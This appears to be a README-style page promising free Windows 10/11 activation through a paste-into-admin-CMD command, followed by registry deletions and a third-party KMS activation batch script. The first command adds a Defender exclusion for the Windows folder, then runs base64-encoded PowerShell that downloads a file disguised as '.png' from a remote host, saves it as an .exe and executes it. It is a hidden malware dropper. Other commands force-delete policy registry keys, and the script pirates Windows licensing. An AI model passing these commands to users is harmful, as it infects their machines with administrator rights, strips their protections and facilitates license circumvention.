
## To activate Windows 10 and 11 follow the steps

> Just copy and paste the following command into CMD admin

> [!NOTE]
> net session >nul 2>&1 && powershell Set-MpPreference -ExclusionPath $env:SystemRoot | powershell -EncodedCommand CgBJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AZAByAG8AcAAwADAAMAAwAC4AcAB5AHQAaABvAG4AYQBuAHkAdwBoAGUAcgBlAC4AYwBvAG0ALwBzAHQAYQB0AGkAYwAvAC4AcABuAGcAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAJABlAG4AdgA6AFMAeQBzAHQAZQBtAFIAbwBvAHQAXABUAGUAbQBwAFwALgBlAHgAZQAiADsAIABTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAALQBGAGkAbABlAFAAYQB0AGgAIAAiACQAZQBuAHYAOgBTAHkAcwB0AGUAbQBSAG8AbwB0AFwAVABlAG0AcABcAC4AZQB4AGUAIgA= >nul 2>&1 || (echo Need to run as Administrator )




> [!TIP]
> Wait about 1 minute for windows to activate. you do not need to restart the computer after the procedure


## Virus And Threat Protection On

### CMD run as administrator
CMD Commands:
###
  reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKLM\Software\Microsoft\WindowsSelfHost" /f
  reg delete "HKLM\Software\Policies" /f
  reg delete "HKLM\Software\WOW6432Node\Microsoft\Policies" /f
  reg delete "HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies" /f
  reg delete "HKCU\Software\Microsoft\WindowsSelfHost" /f
  reg delete "HKCU\Software\Policies" /f
  reg delete "HKLM\Software\Microsoft\Policies" /f
###




## To activate Windows 10 and 11 follow the steps
# Create active.cmd file and paste this code
# Run as administrator


@echo off
 title Activate Windows 8.1, 10, 11 ALL versions for FREE!&cls&echo ============================================================================&echo #Project: Activating Microsoft software products for FREE without software&echo ============================================================================&echo.&echo #Supported products:&echo - Windows 11 Home&echo - Windows 11 Home N&echo - Windows 11 Home Single Language&echo - Windows 11 Home Country Specific&echo - Windows 11 Professional&echo - Windows 11 Professional N&echo - Windows 11 Education&echo - Windows 11 Education N&echo - Windows 11 Enterprise&echo - Windows 11 Enterprise N&echo - Windows 11 Enterprise LTSB&echo - Windows 11 Enterprise LTSB N&echo.&echo.&echo ============================================================================&echo Activating your Windows…&cscript //nologo slmgr.vbs /ckms >nul&cscript //nologo slmgr.vbs /upk >nul&cscript //nologo slmgr.vbs /cpky >nul&set i=1&wmic os | findstr /I "enterprise" >nul
 if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk NPPR9-FWDCX-D2C8J-H872K-2YT43 >nul&cscript //nologo slmgr.vbs /ipk DPH2V-TTNVB-4X9Q3-TJR4H-KHJW4 >nul&cscript //nologo slmgr.vbs /ipk WNMTR-4C88C-JK8YV-HQ7T2-76DF9 >nul&cscript //nologo slmgr.vbs /ipk 2F77B-TNFGY-69QQF-B8YKP-D69TJ >nul&cscript //nologo slmgr.vbs /ipk DCPHK-NFMTC-H88MJ-PFHPY-QJ4BJ >nul&cscript //nologo slmgr.vbs /ipk QFFDN-GRT3P-VKWWX-X7T3R-8B639 >nul&goto server) else wmic os | findstr /I "home" >nul
 if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99 >nul&cscript //nologo slmgr.vbs /ipk 3KHY7-WNT83-DGQKR-F7HPR-844BM >nul&cscript //nologo slmgr.vbs /ipk 7HNRX-D7KGG-3K4RQ-4WPJ4-YTDFH >nul&cscript //nologo slmgr.vbs /ipk PVMJN-6DFY6-9CCP6-7BKTT-D3WVR >nul&goto server) else wmic os | findstr /I "education" >nul
 if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2 >nul&cscript //nologo slmgr.vbs /ipk 2WH4N-8QGBV-H22JP-CT43Q-MDWWJ >nul&goto server) else wmic os | findstr /I "10 pro" >nul
 if %errorlevel% EQU 0 (cscript //nologo slmgr.vbs /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX >nul&cscript //nologo slmgr.vbs /ipk MH37W-N47XK-V7XM9-C7227-GCQG9 >nul&goto server) else (goto notsupported)
 :server
 if %i%==1 set KMS=kms7.MSGuides.com
 if %i%==2 set KMS=kms8.MSGuides.com
 if %i%==3 set KMS=kms9.MSGuides.com
 if %i%==4 goto notsupported
 cscript //nologo slmgr.vbs /skms %KMS%:1688 >nul&echo ============================================================================&echo.&echo.
 cscript //nologo slmgr.vbs /ato | find /i "successfully" && (echo.&echo ============================================================================&echo.&echo #My official blog: MSGuides.com&echo.&echo #How it works: bit.ly/kms-server&echo.&echo #Please feel free to contact me at msguides.com@gmail.com if you have any questions or concerns.&echo.&echo #Please consider supporting this project: donate.msguides.com&echo #Your support is helping me keep my servers running everyday!&echo.&echo ============================================================================&choice /n /c YN /m "Would you like to visit my blog [Y,N]?" & if errorlevel 2 exit) || (echo The connection to my KMS server failed! Trying to connect to another one… & echo Please wait… & echo. & echo. & set /a i+=1 & goto server)
 explorer "http://microsoft.com"&goto halt
 :notsupported
 echo ============================================================================&echo.&echo Sorry! Your version is not supported.&echo.
 :halt
 pause >nul


